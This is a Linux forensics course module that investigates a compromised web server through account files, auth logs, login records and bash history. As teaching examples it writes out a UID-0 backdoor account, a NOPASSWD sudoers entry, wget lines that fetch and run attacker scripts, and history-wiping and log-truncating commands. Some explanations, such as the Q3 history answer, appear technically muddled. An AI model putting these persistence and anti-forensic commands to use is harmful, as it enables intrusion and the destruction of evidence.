Module 9.3: User Accounts, Authentication, and Bash History

CSC 156 – Linux Forensics and Incident Response

⏱ Estimated time: 2.0–2.5 hours 📖 Week 9 – Day 2 🎯 Objectives 3 & 4

1. Investigation Scenario

You are examining a compromised Linux web server — web-prod-03 — after a system administrator noticed an unexpected outbound connection at 02:14 on a Wednesday morning. The server runs Ubuntu 22.04 and is accessible only via SSH key-based authentication. No password logins were supposed to be permitted.

In this module you will learn to extract and analyze the user-account files, authentication logs, binary login-record files, and bash history to reconstruct what happened, who was involved, and what anti-forensic steps the attacker may have taken.

Learning Objectives (this module)

  • Extract user account and privilege data from /etc/passwd, /etc/shadow, and /etc/sudoers.
  • Parse auth.log / secure to identify authentication events and brute-force patterns.
  • Use last, lastb, and lastlog to read binary login-history files.
  • Recover and interpret bash history, including detecting common anti-forensic manipulations.

2. User Accounts and Privilege Files

Linux stores user identity and credential information across several plain-text files in /etc/. During a forensic investigation these files reveal which accounts exist, which have elevated privileges, and whether any suspicious accounts were created.

Each line describes one user account in seven colon-separated fields. The file is world-readable, which is necessary for programs to map UIDs to names. 

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sysmon:x:1001:1001:System Monitor:/home/sysmon:/bin/bash
backdoor:x:0:0::/home/backdoor:/bin/bash
Field #NameExampleForensic significance
1 Username backdoor Look for unfamiliar names, especially created around incident time.
2 Password placeholder x x means the hash lives in /etc/shadow. An empty field means no password — a major red flag.
3 UID 0 UID 0 = root privileges regardless of username. Any non-root account with UID 0 is a backdoor.
4 GID 0 GID 0 (root group) also grants elevated access.
5 GECOS / comment (empty) Often blank on attacker-created accounts; legitimate service accounts typically have a description.
6 Home directory /home/backdoor Check whether the directory exists and what files it contains.
7 Login shell /bin/bash Service accounts should use /usr/sbin/nologin or /bin/false. An interactive shell on a service account is suspicious.
Key indicator: The entry backdoor:x:0:0::/home/backdoor:/bin/bash has UID 0 and GID 0 — it has full root privileges under a disguised name. This is one of the most common Linux persistence mechanisms.

/etc/shadow is readable only by root. It stores hashed passwords and password-aging metadata in nine colon-separated fields. 

backdoor:$6$rounds=5000$xyz123$AbCdEf...:19800:0:99999:7:::

The password hash uses the format: $id$[options$]salt$hash

Algorithm IDAlgorithmNotes
$1$MD5Obsolete — weak; should never appear on a modern system.
$2y$bcryptCommon on Debian/Ubuntu; adaptive cost factor.
$5$SHA-256Reasonable but SHA-512 preferred.
$6$SHA-512Current default on most modern distros.
!Locked accountPassword field begins with ! — account cannot be used for password login.
* or !!No password / never setSystem accounts; !! means account was created but password was never set.

Field 3 is the last-changed date expressed as days since the Unix epoch (1970-01-01). A recently changed date on an account you did not create is significant.

Do not crack passwords on systems you do not own — even for forensic practice. In a controlled lab environment, password cracking is a standard step, but always ensure you have written authorization before attempting it.

High-risk groups

Membership in certain groups is functionally equivalent to having root access:

  • sudo or wheel — can run any command as root.
  • docker — can mount the host filesystem; equivalent to root.
  • disk — direct block-device access; can read/write any file.
  • lxd / lxc — container control; escalation possible.
# Check which accounts are in the sudo group
grep -E "^sudo:" /etc/group

# Example output
sudo:x:27:ubuntu,sysmon,backdoor

/etc/sudoers and NOPASSWD entries

/etc/sudoers controls which users and groups can run commands as root and whether they need to authenticate. An attacker will often add a NOPASSWD entry to maintain access without needing a password: 

# Legitimate entry
%sudo   ALL=(ALL:ALL) ALL

# Attacker-added entry — allows backdoor to run anything without a password
backdoor ALL=(ALL) NOPASSWD:ALL

# Entries in /etc/sudoers.d/ are also included — check that directory too
ls -la /etc/sudoers.d/
Always check /etc/sudoers.d/ as well as /etc/sudoers. Attackers prefer the subdirectory because it receives less scrutiny.

3. Authentication Log Analysis

Authentication events are recorded in plain-text log files. On Debian/Ubuntu the file is /var/log/auth.log; on RHEL/CentOS it is /var/log/secure. Both follow a similar syslog format: timestamp hostname service[PID]: message. 

Mar  5 02:14:07 web-prod-03 sshd[8821]: Accepted publickey for backdoor from 198.51.100.47 port 54321 ssh2: RSA SHA256:XYZ...

Key fields to note:

  • Username: backdoor — matches the suspicious /etc/passwd entry.
  • Source IP: 198.51.100.47 — external address; correlate with threat intelligence.
  • Time: 02:14 — unusual hour for legitimate maintenance.
  • Auth method: publickey — attacker had already installed an SSH key.
Mar  4 23:58:12 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
Mar  4 23:58:14 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
Mar  4 23:58:15 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
Mar  4 23:58:31 web-prod-03 sshd[7701]: message repeated 64 more times: [ Failed password for root...]

Multiple failures in rapid succession from the same IP are the signature of a brute-force or credential-stuffing attack. Compare timestamps: the gap between lines indicates automation (sub-second) vs. a human attacker (multi-second). 

# Count failed attempts by source IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20
Mar  5 02:15:03 web-prod-03 sudo: backdoor : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash

This entry tells us:

  • User backdoor ran sudo /bin/bash — obtained an interactive root shell.
  • Working directory was /root — the attacker was already in the root home directory.
  • No COMMAND not found or authentication failure — the NOPASSWD entry was in effect.
Tip: Rotate through archived logs too — auth.log.1, auth.log.2.gz, etc. Attackers who know logging is enabled may wait for log rotation to partially obscure their early reconnaissance.

4. Binary Login History Files

Linux maintains three binary files that record login sessions, failed attempts, and per-account last-login times. Because they are binary, you cannot read them with cat — you must use the corresponding command-line tools.

FileToolRecords
/var/log/wtmp last Successful logins, logouts, reboots, and run-level changes.
/var/log/btmp lastb Failed login attempts (requires root to read).
/var/log/lastlog lastlog Most recent login for every account on the system.

Using the tools

# List all sessions recorded in wtmp (most recent first)
last -F

# Read a wtmp from a forensic image (does not need to be the live file)
last -f /mnt/evidence/var/log/wtmp

# List failed logins from btmp
sudo lastb -F

# Show last login for all accounts
lastlog

# Show only accounts that HAVE logged in recently
lastlog | grep -v "Never logged in"

Sophisticated attackers often clear or modify these binary files to remove login evidence. Look for:

  • File smaller than expected — entries are fixed-size records. A wtmp that is unusually small compared to the system's age is suspicious. Compare file size against archived backups or the system's install date.
  • Truncated to zero bytes — cat /dev/null > /var/log/wtmp is a classic anti-forensic technique. A zero-byte wtmp when the system has been running for months is an immediate red flag.
  • Gap in reboot records — wtmp records every reboot. If the system has been up for 90 days but wtmp only shows 10 days of history, entries were probably deleted.
  • Mismatch with auth.log — if auth.log shows a successful SSH session but there is no corresponding entry in wtmp, wtmp was likely edited.
Tampering with these files is itself evidence of an attacker with root access and awareness of forensic investigation techniques. Document the tampered state — do not attempt to reconstruct the original data unless you have a verified backup.

5. Bash History Artifacts

Bash (and other shells) write a record of commands to a history file when a session ends. This file is a plain-text goldmine for reconstructing attacker activity — and consequently a frequent target for anti-forensic techniques.

Default locations

  • ~/.bash_history — commands for the user's default shell.
  • ~/.zsh_history, ~/.sh_history — shell-specific equivalents.
  • /root/.bash_history — root's command history; especially valuable.

Environment variables that control history behavior

VariableDefaultForensic impact if changed
HISTFILE ~/.bash_history Set to /dev/null to prevent any history from being written.
HISTSIZE 500–1000 Set to 0 to disable in-memory history accumulation.
HISTFILESIZE 500–2000 Set to 0 to prevent anything from being saved to disk.
HISTTIMEFORMAT (unset) When set, bash prepends timestamps to each entry — very useful forensically.
HISTIGNORE (unset) Can be set to suppress specific command patterns from being recorded.

Attackers use several well-known techniques to suppress or destroy bash history:

  • Redirect HISTFILE to /dev/null 
    export HISTFILE=/dev/null
    All subsequent commands in this session will not be saved.
  • Set HISTSIZE to zero 
    export HISTSIZE=0
export HISTFILESIZE=0
    Prevents history from accumulating in memory or being written.
  • Prepend a space 
     rm -rf /tmp/malware
    Commands beginning with a space are not saved when HISTCONTROL=ignorespace is set (common default).
  • Manually clear or overwrite the file 
    cat /dev/null > ~/.bash_history
history -c
rm ~/.bash_history
  • Unsetting the history file 
    unset HISTFILE
    When bash exits, it writes to HISTFILE. If HISTFILE is unset, no file is updated.
The anti-forensic act is itself evidence. Finding any of these commands in a history file — or finding a truncated/missing file where one should exist — tells you the attacker was sophisticated and actively trying to cover their tracks. 
# Read a history file from a forensic image (as root)
cat /mnt/evidence/root/.bash_history

# If HISTTIMEFORMAT was set, entries look like:
#1741132440
export HISTFILE=/dev/null
#1741132447
wget http://203.0.113.22/implant.sh -O /tmp/.x
#1741132449
chmod +x /tmp/.x && /tmp/.x
#1741132512
cat /dev/null > ~/.bash_history

The #-prefixed lines are Unix timestamps. Convert them with date -d @1741132440 or an online epoch converter.

Even when the attacker deleted the history file, you may recover commands from:

  • Unallocated disk space (if the file was deleted but not securely wiped).
  • Swap space — commands may be paged out during execution.
  • Shell session logs if the terminal emulator or script utility was active.
  • Audit logs (/var/log/audit/audit.log) if the auditd daemon was running.

6. Mini-Case Investigation

Apply what you have learned to the web-prod-03 incident. Work through each evidence excerpt below, then reveal the model analysis to check your reasoning.

🔍 web-prod-03 — Evidence Excerpts
Exhibit A — /etc/passwd excerpt (suspicious lines only) 
sysmon:x:1001:1001:System Monitor:/home/sysmon:/bin/bash
support:x:0:0::/home/support:/bin/bash

Q1: What is forensically significant about the support account?

Analysis: The support account has UID 0 and GID 0 — it has full root privileges despite the non-root username. This is a classic Linux backdoor account. The empty GECOS field and the home directory /home/support (rather than /root) suggest it was created to be less obvious. Check when /home/support was created and whether it contains an authorized_keys file.
Exhibit B — /var/log/auth.log excerpt 
Mar  5 02:10:44 web-prod-03 sshd[8801]: Failed password for root from 203.0.113.22 port 52101 ssh2
Mar  5 02:10:45 web-prod-03 sshd[8801]: Failed password for root from 203.0.113.22 port 52101 ssh2
Mar  5 02:10:46 web-prod-03 sshd[8801]: message repeated 118 more times: [Failed password for root...]
Mar  5 02:14:07 web-prod-03 sshd[8821]: Accepted publickey for support from 203.0.113.22 port 54321 ssh2

Q2: What two phases of attacker activity does this log excerpt show?

Analysis: Phase 1 (02:10–02:11): A brute-force attempt against the root account — 120+ failures in under two seconds indicates automated tooling, not a human typist. The attempts fail, suggesting root direct login was disabled or SSH keys were required. Phase 2 (02:14): Successful public-key authentication for the support backdoor account from the same source IP. This confirms the attacker had already installed an SSH key in /home/support/.ssh/authorized_keys on a prior visit.
Exhibit C — /root/.bash_history excerpt 
#1741133640
id
#1741133641
cat /etc/shadow
#1741133655
wget http://203.0.113.22/stage2.sh -O /tmp/.update
#1741133657
chmod +x /tmp/.update && /tmp/.update
#1741133720
export HISTFILE=/dev/null
#1741133721
cat /dev/null > /root/.bash_history

Q3: The attacker ran two anti-forensic commands near the end of this log. Why might these commands still be visible?

Analysis: The commands export HISTFILE=/dev/null and cat /dev/null > /root/.bash_history were run in the same session in which history was already being recorded. Bash accumulates history in memory during a session and writes it on exit. When the attacker redirected HISTFILE and then cleared the file, the already-accumulated in-memory history was written to the file path that was current at session start. The clearing command then partially wiped it, but bash had already synced prior commands. Additionally, the overwrite only zeroed the file — it did not securely wipe the disk sectors. The previous content may be recoverable from unallocated space with a tool like Autopsy or Sleuth Kit.
Exhibit D — last output (excerpt) 
support  pts/0  203.0.113.22  Wed Mar  5 02:14 - 02:31 (00:17)
wtmp begins Tue Feb  4 09:00

The system has been running without interruption since installation 14 months ago. The wtmp file is 4 KB.

Q4: What does the wtmp file size suggest, and how would you investigate further?

Analysis: A 14-month-old system with continuous uptime should have a wtmp file containing hundreds or thousands of records — reboots, logins, and run-level changes accumulate over time. Each utmp record is 384 bytes on a 64-bit Linux system. A 4 KB wtmp holds roughly 10 records, which is far too few for 14 months of activity. This strongly suggests the file was truncated or replaced. To investigate further: (1) Check the file's mtime — if it was recently modified, that is additional confirmation. (2) Compare against auth.log to find logins that should appear in wtmp but do not. (3) If a filesystem image is available, search unallocated space for utmp-format binary structures to recover deleted records.
